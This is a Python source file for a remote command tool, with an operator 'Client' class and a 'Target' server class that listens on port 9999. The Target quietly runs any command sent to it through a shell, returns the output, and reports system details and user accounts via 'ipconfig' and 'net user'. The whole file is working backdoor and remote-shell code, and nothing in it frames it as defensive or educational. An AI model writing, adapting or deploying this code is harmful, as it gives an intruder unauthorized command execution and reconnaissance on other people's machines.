import socket
import os
import subprocess
import platform


class Machine:
    def __init__(self):
        self.buffer = 2048
        # create socket
        try:
            self.s = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    def quit(self):
        self.s.close()


# client is "us"
# Default: 127.0.0.1
class Client(Machine):
    def __init__(self, host, port=9999):
        super().__init__()
        self.host = host
        self.port = port

    def connect_to_server(self):
        self.s.connect((self.host, self.port))

    def reverse_shell_send_command(self):
        self.s.send(str.encode("shell"))
        print("Welcome into the Shell Monitor: \n")
        print("-->", end=" ")
        while True:
            cmd = input("")
            if len(str.encode(cmd)) > 0:
                self.s.send(str.encode(cmd, "utf-8"))
                client_response = str(self.s.recv(self.buffer), "utf-8")
                print(client_response, end="")
                if cmd == "quit":
                    break

    def quit(self):
        self.s.send(str.encode("quit"))
        response_target = self.s.recv(self.buffer)
        print(response_target.decode("utf-8"))
        super().quit()

    def getinfo(self, info):
        self.s.send(str.encode(str(info)))
        info = self.s.recv(self.buffer)
        print(info.decode("utf-8"))
        info = self.s.recv(self.buffer)
        print(info.decode("utf-8"))
        input("\n\nPress ENTER")

    def print_target(self, print_bool):
        if print_bool:
            self.s.send(str.encode("print_target_True"))
        else:
            self.s.send(str.encode("print_target_False"))

    def set_target_buffer(self, size):
        self.s.send(str.encode("buffer_size"))
        self.s.send(str.encode(str(size)))


# Target is the server
class Target(Machine):

    # initialize host and port server
    def __init__(self, host="", port=9999):
        super().__init__()
        self.host = host
        self.port = port
        self.information = []
        self.print = False

    # bind de socket with the port
    def socket_bind(self):
        if self.print:
            print("Bidding socket to port " + str(self.port))
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except socket.error as msg:
            print("Socket binding error: " + str(msg) + "\n" + "Do you want to retry ?")
            if input() == "y" or "yes":
                self.socket_bind()

    # accept the new co
    def socket_accept(self):
        self.s, self.information = self.s.accept()
        if self.print:
            print("Connexion has been establish | " + "IP " + self.information[0] + " | Port : " +
                  str(self.information[1]))

    def what_to_do(self):
        while True:
            instruction = self.s.recv(self.buffer)
            instruction = instruction.decode("utf-8")
            if instruction == "quit":
                if self.print:
                    print("Leave the programme... Bye")
                self.quit()
                break
            elif instruction == "print_target_True":
                self.print = True
            elif instruction == "print_target_False":
                self.print = False
            elif instruction == "shell":
                self.reverse_shell_target()
            elif instruction == "getinfo_generality":
                self.getinfo_target_generality()
            elif instruction == "ipconfig" or instruction == "net user":
                self.getinfo_target_cmd(instruction)
            elif instruction == "buffer_size":
                self.buffer = int(self.s.recv(self.buffer))
                if self.print:
                    print("the buffer size is %d now", self.buffer)
                    print(self.buffer)
                    print(type(self.buffer))

    def reverse_shell_target(self):
        while True:
            data = self.s.recv(self.buffer)
            if data.decode("utf-8") == "quit":
                if self.print:
                    print("Leaving Shell")
                self.s.send(str.encode("we are leaving \n"))
                break
            else:
                try:
                    if data[:2].decode("utf-8") == 'cd':
                        os.chdir(data[3:].decode("utf-8"))
                    if len(data) > 0:
                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
                        output_str = output_bytes.decode("utf-8", errors='replace')
                        self.s.send(str.encode(output_str + str(os.getcwd()) + "> "))
                        if self.print:
                            print(output_str)
                except OSError as msg:
                    error_msg = "Error OS : " + str(msg)
                    if self.print:
                        print(error_msg)
                    self.s.send(str.encode(error_msg))

    # Get information from the target
    def getinfo_target_generality(self):
        self.s.send(str.encode("INFORMATION'S TARGET: \n"))
        self.s.send(str.encode("System: " + platform.uname()[0]
                               + "\nUser (node): " + platform.uname()[1]
                               + "\nRelease: " + platform.uname()[2]
                               + "\nVersion: " + platform.uname()[3]
                               + "\nMachine: " + platform.uname()[4]
                               + "\nProcessor: " + platform.uname()[5]))
        if self.print:
            print("YOUR INFORMATION \n")
            print("System: " + platform.uname()[0] + "\nUser (node): " + platform.uname()[1] + "\nRelease: "
                  + platform.uname()[2] + "\nVersion: " + platform.uname()[3] + "\nMachine: " + platform.uname()[4]
                  + "\nProcessor: " + platform.uname()[5])

    def getinfo_target_cmd(self, command):
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = output_bytes.decode("utf-8", errors='replace')
        self.s.send(str.encode(command))
        self.s.send(str.encode(output_str))
        if self.print:
            print(command)
            print(output_str)

    # close de connection and the socket
    def quit(self):
        self.s.send(str.encode("The connection is closing. Say bye to \n\tIP: " + self.information[0]
                               + " \n\tPort " + str(self.information[1])))
        try:
            super().quit()
        except socket.error as msg:
            print("the socket fail to close : " + str(msg))


